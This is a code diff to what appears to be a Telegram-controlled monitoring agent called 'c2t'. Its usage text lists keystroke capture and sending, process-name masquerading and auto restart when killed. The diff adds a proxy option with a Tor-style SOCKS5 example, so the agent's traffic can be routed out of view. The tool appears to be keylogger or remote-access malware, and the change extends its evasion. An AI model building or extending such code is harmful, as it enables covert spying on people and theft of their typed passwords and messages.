@@ -78,6 +78,7 @@ static void print_usage(FILE *stream)
         "  --send-keyboard        Enable keyboard monitoring\n"
         "  --no-keyboard          Disable keyboard monitoring\n"
         "  --keyboard-flush <ms>  Inactivity delay before sending keystrokes (500-60000 ms)\n"
+        "  --proxy <url>          Use HTTP/HTTPS/SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)\n"
 #ifdef C2T_ENABLE_PROCESS_MASQUERADE
         "  --daemon-name <name>   Set custom daemon process name (default: c2t)\n"
         "  --supervisor-name <name>  Set custom supervisor process name (default: t2c)\n"
@@ -212,6 +213,9 @@ static void print_usage(FILE *stream)
                  (unsigned long long)c2t_config_get()->retry_delay_ms);
     c2t_log_info("config", "Auto restart on crash/kill=%s",
                  c2t_config_get()->auto_restart ? "enabled" : "disabled");
+    c2t_log_info("config", "Network proxy=%s",
+                 (c2t_config_get()->proxy && *c2t_config_get()->proxy)
+                     ? c2t_config_get()->proxy : "disabled (direct connection)");
     if (!telegram_init()) {
         c2t_log_error("main", "Telegram initialization failed");
         if (!is_worker) c2t_runtime_release();
